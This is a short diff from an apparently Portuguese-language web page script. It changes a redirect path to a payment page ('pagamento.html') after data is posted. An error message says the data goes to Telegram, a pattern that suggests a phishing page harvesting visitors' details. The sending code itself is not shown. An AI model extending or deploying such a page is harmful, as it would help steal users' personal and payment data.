@@ -248,7 +248,8 @@
       .then(response => response.json())
       .then(data => {
         // Redirecionar para a página de pagamento após o envio dos dados
-        window.location.href = '/VeryPagement/pagamento.html';
+        window.location.href = 'VeryPagement/pagamento.html';
+
       })
       .catch(error => {
         console.error('Erro ao enviar os dados para o Telegram:', error);
